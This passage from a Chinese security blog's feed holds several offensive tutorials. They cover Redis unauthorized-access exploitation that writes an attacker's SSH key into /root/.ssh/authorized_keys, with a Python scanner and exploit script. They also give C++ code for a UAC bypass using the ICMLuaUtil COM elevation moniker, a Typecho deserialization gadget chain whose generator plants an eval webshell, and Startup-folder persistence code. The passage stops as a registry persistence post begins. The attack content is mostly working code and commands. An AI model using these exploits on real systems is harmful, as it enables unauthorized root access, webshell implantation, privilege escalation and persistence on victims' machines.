src="https://s3.ax1x.com/2021/03/06/6nJ6fA.png" alt="6nJ6fA.png"></a></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>修改数据库默认路径为/root/.ssh，默认缓存文件为authorized.keys，把目标主机缓存的公钥作为value保存在authorized.keys文件中，这样就在服务器端/root/.ssh下生成了一个授权的key</p><p>1.本地主机生成密钥key</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/6nJdOK"><img src="https://s3.ax1x.com/2021/03/06/6nJdOK.png" alt="6nJdOK.png"></a></p><p>2.在目录/root/.ssh下查看生成结果，并把公钥导入txt文件中</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lsl">cd /root/.ssh<br>ls<br>(echo -e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>; cat id_rsa.pub;echo -e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>) &gt; <span class="hljs-type">key</span>.txt<br>cat <span class="hljs-type">key</span>.txt<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/6nJ0eO"><img src="https://s3.ax1x.com/2021/03/06/6nJ0eO.png" alt="6nJ0eO.png"></a></p><p>3.把生成的公钥导入Redis缓存中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/root/</span>key.txt | redis-cli -h xx.xx.xx.xx<br></code></pre></td></tr></table></figure><p>4.连接到目标主机，更改配置文件路径为/root/.ssh，设置文件名称为authorized-keys</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">redis-cli -h xx.xx.xx.xx<br><br>config <span class="hljs-builtin-name">set</span> dir /root/.ssh<br>Config <span class="hljs-builtin-name">set</span> dbfilename authorized_keys<br>save<br></code></pre></td></tr></table></figure><p>5.ssh连接到目标主机</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ssh</span> <span class="hljs-selector-tag">xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><br></code></pre></td></tr></table></figure><h2 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h2><p>github地址：<a href="https://github.com/sp4zcmd/SimpleRedisScanner">https://github.com/sp4zcmd/SimpleRedisScanner</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Usage</span>():</span><br>    print(<span class="hljs-string">&#x27;RedisScanner.py 127.0.0.1 key.txt&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Scan</span>(<span class="hljs-params">ip</span>):</span><br>    payload=<span class="hljs-string">&quot;\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a&quot;</span><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.settimeout(<span class="hljs-number">10</span>)<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((ip, <span class="hljs-number">6379</span>))<br>        s.sendall(payload.encode())<br>        recvdata=s.recv(<span class="hljs-number">1024</span>).decode()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;redis_version&#x27;</span> <span class="hljs-keyword">in</span> recvdata:<br>            print(<span class="hljs-string">&#x27;[+] %s is vulnerable &#x27;</span> %ip)<br>            <span class="hljs-comment">#print(recvdata)</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span>:<br>        print(<span class="hljs-string">&#x27;[-] %s is not vulnerable &#x27;</span> %ip)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">WriteSSHKeygen</span>(<span class="hljs-params">ip,sshkey</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        r = redis.StrictRedis(host=ip, port=<span class="hljs-number">6379</span>, db=<span class="hljs-number">0</span>, socket_timeout=<span class="hljs-number">2</span>)<br>        r.flushall()<br>        r.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;crackit&#x27;</span>, sshkey)<br>        r.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>, <span class="hljs-string">&#x27;/root/.ssh/&#x27;</span>)<br>        r.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>, <span class="hljs-string">&#x27;authorized_keys&#x27;</span>)<br>        r.save()<br>        print(<span class="hljs-string">&#x27;[+] Write SSHkeygen successful&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        print(<span class="hljs-string">&#x27;[-] Write SSHkeygen Failed&#x27;</span>)<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">3</span>):<br>        ip=sys.argv[<span class="hljs-number">1</span>]<br>        sshkeyfile=sys.argv[<span class="hljs-number">2</span>]<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sshkeyfile, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                sshkey = f.read()<br>        <span class="hljs-keyword">except</span>:<br>            print(<span class="hljs-string">&#x27;Read SSHkeygen Failed&#x27;</span>)<br>            <span class="hljs-keyword">pass</span><br><br>        <span class="hljs-keyword">if</span> Scan(ip):<br>            WriteSSHKeygen(ip, sshkey)<br>    <span class="hljs-keyword">else</span>:<br>        Usage()<br></code></pre></td></tr></table></figure><h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p><a href="https://imgtu.com/i/6nJay6"><img src="https://s3.ax1x.com/2021/03/06/6nJay6.png" alt="6nJay6.png"></a></p><p>写入成功</p><p><a href="https://imgtu.com/i/6nJgSI"><img src="https://s3.ax1x.com/2021/03/06/6nJgSI.png" alt="6nJgSI.png"></a></p><p>成功连接</p><p><a href="https://imgtu.com/i/6nJ2lt"><img src="https://s3.ax1x.com/2021/03/06/6nJ2lt.png" alt="6nJ2lt.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>基于COM组件接口的BypassUAC</title>
    <link href="/2021/03/04/%E5%9F%BA%E4%BA%8ECOM%E7%BB%84%E4%BB%B6%E6%8E%A5%E5%8F%A3%E7%9A%84BypassUAC/"/>
    <url>/2021/03/04/%E5%9F%BA%E4%BA%8ECOM%E7%BB%84%E4%BB%B6%E6%8E%A5%E5%8F%A3%E7%9A%84BypassUAC/</url>
    
    <content type="html"><![CDATA[<p>COM提升名称（COM Elevation Moniker）技术允许运行在用户账户控制下的应用程序用提升权限的方法来激活COM类，以此提升COM接口权限。其中，ICMLuaUtil接口提供了ShellExec方法执行命令，创建指定进程。</p><p>原理是利用COM提升名称以高权限调用ICMLuaUtil接口，从而以高权限执行ShellExec创建指定进程。使用权限提升COM类的程序必须通过调用CoCreateInstanceAsAdmin函数创建COM类，必须用可信程序运行，如果执行COM提升名称代码的程序身份不可信，则会触发UAC，要Bypass UAC必须让这一段代码在Windows的可信程序中运行，如记事本、计算器、rundll32.exe等，通过DLL注入或是劫持技术，将这段代码注入到这些可欣程序的进程空间中。通过rundll32.exe调用自定义DLL中的导出函数，执行COM提升名称的代码。</p><h1 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h1><p>初始化com库-&gt;创建高权限的ICMLuaUtil接口-&gt;调用ICMLuaUtil的ShellExec方法-&gt;以高权限执行cmd</p><p>实质上是以高权限运行COM组件ICMLuaUtil,ICMLuaUtil中可调用ShellExecute执行程序。定义成导出函数，用可信程序rundll32调用导出函数</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;BypassUAC.h&quot;</span></span><br><br><span class="hljs-function">HRESULT <span class="hljs-title">CoCreateInstanceAsAdmin</span><span class="hljs-params">(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)</span></span><br><span class="hljs-function"></span>&#123;<br>    BIND_OPTS3 bo;<br>    WCHAR wszCLSID[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    WCHAR wszMonikerName[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    HRESULT hr = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 初始化COM环境</span><br>    ::CoInitialize(<span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// 构造字符串</span><br>    ::StringFromGUID2(rclsid, wszCLSID, (<span class="hljs-keyword">sizeof</span>(wszCLSID) / <span class="hljs-keyword">sizeof</span>(wszCLSID[<span class="hljs-number">0</span>])));<br>    hr = ::StringCchPrintfW(wszMonikerName, (<span class="hljs-keyword">sizeof</span>(wszMonikerName) / <span class="hljs-keyword">sizeof</span>(wszMonikerName[<span class="hljs-number">0</span>])), <span class="hljs-string">L&quot;Elevation:Administrator!new:%s&quot;</span>, wszCLSID);<br>    <span class="hljs-keyword">if</span> (FAILED(hr))<br>    &#123;<br>        <span class="hljs-keyword">return</span> hr;<br>    &#125;<br><br>    <span class="hljs-comment">// 设置BIND_OPTS3</span><br>    ::RtlZeroMemory(&amp;bo, <span class="hljs-keyword">sizeof</span>(bo));<br>    bo.cbStruct = <span class="hljs-keyword">sizeof</span>(bo);<br>    bo.hwnd = hWnd;<br>    bo.dwClassContext = CLSCTX_LOCAL_SERVER;<br><br>    <span class="hljs-comment">// 创建名称对象并获取COM对象</span><br>    hr = ::CoGetObject(wszMonikerName, &amp;bo, riid, ppVoid);<br>    <span class="hljs-keyword">return</span> hr;<br>&#125;<br><br><br><span class="hljs-function">BOOL <span class="hljs-title">CMLuaUtilBypassUAC</span><span class="hljs-params">(LPWSTR lpwszExecutable)</span></span><br><span class="hljs-function"></span>&#123;<br>    HRESULT hr = <span class="hljs-number">0</span>;<br>    CLSID clsidICMLuaUtil = &#123; <span class="hljs-number">0</span> &#125;;<br>    IID iidICMLuaUtil = &#123; <span class="hljs-number">0</span> &#125;;<br>    ICMLuaUtil* CMLuaUtil = <span class="hljs-literal">NULL</span>;<br>    BOOL bRet = FALSE;<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        ::CLSIDFromString(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil);<br>        ::IIDFromString(IID_ICMLuaUtil, &amp;iidICMLuaUtil);<br><br>        <span class="hljs-comment">// 提权</span><br>        hr = CoCreateInstanceAsAdmin(<span class="hljs-literal">NULL</span>, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil));<br>        <span class="hljs-keyword">if</span> (FAILED(hr))<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 启动程序</span><br>        hr = CMLuaUtil-&gt;lpVtbl-&gt;ShellExec(CMLuaUtil, lpwszExecutable, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, SW_SHOW);<br>        <span class="hljs-keyword">if</span> (FAILED(hr))<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        bRet = TRUE;<br>    &#125; <span class="hljs-keyword">while</span> (FALSE);<br><br>    <span class="hljs-comment">// 释放</span><br>    <span class="hljs-keyword">if</span> (CMLuaUtil)<br>    &#123;<br>        CMLuaUtil-&gt;lpVtbl-&gt;Release(CMLuaUtil);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br><br><span class="hljs-comment">//导出函数</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> CALLBACK <span class="hljs-title">BypassUAC</span><span class="hljs-params">(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, <span class="hljs-keyword">int</span> iCmdShow)</span></span><br><span class="hljs-function"></span>&#123;<br>    CMLuaUtilBypassUAC((LPWSTR)<span class="hljs-string">L&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>用lordpe查看生成dll的导出表，发现存在导出函数</p><p><a href="https://imgtu.com/i/6ZYnVH"><img src="https://s3.ax1x.com/2021/03/04/6ZYnVH.png" alt="6ZYnVH.png"></a></p><p>用rundll32.exe调用导出函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">rundll32 <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ComBypassUACdll</span>.</span></span>dll,BypassUAC<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/6ZYeqe"><img src="https://s3.ax1x.com/2021/03/04/6ZYeqe.png" alt="6ZYeqe.png"></a></p><p>BypassUAC成功</p><p><a href="https://imgtu.com/i/6ZYuad"><img src="https://s3.ax1x.com/2021/03/04/6ZYuad.png" alt="6ZYuad.png"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>typecho反序列化分析</title>
    <link href="/2021/03/03/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <url>/2021/03/03/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>1.install.php</p><p>install.php中存在unserialize函数，__typecho_config可控。值被作为参数传入类Typecho_Db</p><p><a href="https://imgbed.cn/preview?id=603f366b28110700016f75f6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8d5d50a3-2fe6-4c8c-baaf-fabd0b3a1869.png" alt="imgbed.cn图床"></a></p><p>2./var/Typecho/Cookie.php</p><p>Typecho_Cookie::get方法从Cookie或者是POST数组中获取数据</p><p><a href="https://imgbed.cn/preview?id=603f36733cfcc50001576f61"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e5924563-8b86-4d61-8ddc-bb46aaeea102.png" alt="imgbed.cn图床"></a></p><p>3./var/Typecho/Db.php</p><p>跟进类Typecho_Db,传入的参数被作为字符串拼接，触发__toString()，全局搜索toString</p><p><a href="https://imgbed.cn/preview?id=603f394ae9788300015e11ee"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/5eed6331-803d-4ef0-a608-5c6e74f41a63.png" alt="imgbed.cn图床"></a></p><p>4./var/Typecho/Feed.php中存在可利用toString方法</p><p>满足条件self::RSS2 == $this-&gt;_type执行下面的语句，如果$item[‘author’]是一个类，就会触发__get()方法，开始全局搜索get方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> .= <span class="hljs-string">&#x27;&lt;dc:creator&gt;&#x27;</span> . htmlspecialchars(<span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="hljs-string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="hljs-built_in">self</span>::EOL;<br></code></pre></td></tr></table></figure><p><a href="https://imgbed.cn/preview?id=603f36877c46e800014fad42"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/02dedb11-1de4-4f60-9e43-b412f42870e7.png" alt="imgbed.cn图床"></a></p><p>5./var/Typecho/request.php</p><p>request.php中Typecho_Request类存在__get()方法，<code>__get</code>()含有一个参数，即要获取的成员属性的名称，$key=’screenName’</p><p><a href="https://imgbed.cn/preview?id=603f369b2ff44a0001828d25"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/03339ab0-a0e5-4f54-83b5-f3dde2d3489b.png" alt="imgbed.cn图床"></a></p><p>6.跟进get方法</p><p><a href="https://imgbed.cn/preview?id=603f36ae91df94000121437f"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/abc5d750-4cf6-444c-a8d2-64f33fd5f834.png" alt="imgbed.cn图床"></a></p><p>6.跟进<code>_applyFilter</code>方法，发现call_user_func函数，到达终点。filter属性为要执行的函数，$value来源为传入参数，在get函数中被<code>$value = $this-&gt;_params[$key]</code>赋值，来源于属性_params。<code>$this-&gt;_params[$key]</code>等于<code>$this-&gt;_params[&#39;screenName&#39;]</code></p><p><a href="https://imgbed.cn/preview?id=603f36ba6df2d3000109c02c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/4f2c37c1-923d-4950-83c4-b4592fd71c4a.png" alt="imgbed.cn图床"></a></p><h2 id="构造利用链"><a href="#构造利用链" class="headerlink" title="构造利用链"></a>构造利用链</h2><p>令Typecho_Db类中的$adapterName=$config[‘adapter’]等于Feed.php中的Typecho_Feed类，创建一个数组$a=array(‘adapter’ =&gt;new Typecho_Feed(),’prefix’ =&gt; ‘typecho_’)</p><p>令Typecho_Feed类中的$item[‘author’]等于Typecho_Request类</p><p>令Typecho_Request类中的属性<code>_params=array(&#39;screenName&#39;=&gt;&#39;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[\&#39;a\&#39;]); ?&gt;&quot;)&#39;)</code></p><p>令Typecho_Request类中的属性_filter=array(‘assert’)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_filter</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_params</span> = <span class="hljs-keyword">array</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;assert&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">&#x27;screenName&#x27;</span>] = <span class="hljs-string">&#x27;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[\&#x27;a\&#x27;]); ?&gt;&quot;)&#x27;</span>;<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">&#x27;RSS 2.0&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_type</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_items</span> = <span class="hljs-keyword">array</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_type=<span class="hljs-built_in">self</span>::RSS2;<br>        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>]=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;author&#x27;</span>=&gt;<span class="hljs-keyword">new</span> Typecho_Request());<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;adapter&#x27;</span> =&gt;<span class="hljs-keyword">new</span> Typecho_Feed(),<span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;typecho_&#x27;</span>);<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize(<span class="hljs-variable">$a</span>)));<br></code></pre></td></tr></table></figure><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>install.php中要求触发反序列化需要满足两个条件</p><p>必须有GET参数finish</p><p>Refer必须为本站链接，如<a href="http://127.0.0.1/typecho">http://127.0.0.1/typecho</a></p><p><a href="https://imgbed.cn/preview?id=603f36c61b484900018f385a"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/736ce55e-b9e8-4ac4-81ad-822f44a1be51.png" alt="imgbed.cn图床"></a></p><h2 id="利用结果"><a href="#利用结果" class="headerlink" title="利用结果"></a>利用结果</h2><p><a href="https://imgbed.cn/preview?id=603f36cf91df9400012143b4"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/4870195c-db40-4b0c-b73b-2511d30812bf.png" alt="imgbed.cn图床"></a></p><p>写入成功</p><p><a href="https://imgbed.cn/preview?id=603f36ddb3108e0001913085"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8acf0548-facf-40cd-ae80-c616e44c718c.png" alt="imgbed.cn图床"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>通过添加启动目录和和修改注册表进行权限维持</title>
    <link href="/2021/03/01/%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95%E5%92%8C%E5%92%8C%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <url>/2021/03/01/%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95%E5%92%8C%E5%92%8C%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h1 id="添加启动目录"><a href="#添加启动目录" class="headerlink" title="添加启动目录"></a>添加启动目录</h1><p>由于启动目录不固定，需要先通过SHGetSpecialFolderPath获取启动路径，再CopyFile把要自启动的程序复制过去</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;shlobj_core.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">wchar_t</span> StartupFolder[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-keyword">wchar_t</span> Path[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><br>BOOL bRet= SHGetSpecialFolderPath(<span class="hljs-literal">NULL</span>, StartupFolder, CSIDL_STARTUP, FALSE);<br><span class="hljs-keyword">if</span> (!bRet) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br>GetModuleFileName(<span class="hljs-literal">NULL</span>, (LPWSTR)&amp;Path, MAX_PATH);<br>wcscat_s(StartupFolder, <span class="hljs-string">L&quot;\\Persistance.exe&quot;</span>);<br>MessageBox(<span class="hljs-literal">NULL</span>, StartupFolder, <span class="hljs-string">L&quot;StartupFolder&quot;</span>, MB_OK);<br><span class="hljs-keyword">if</span> (CopyFile(Path, StartupFolder, FALSE)) &#123;<br>MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;succeed&quot;</span>, <span class="hljs-string">L&quot;succeed&quot;</span>, MB_OK);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="修改注册表"><a href="#修改注册表" class="headerlink" 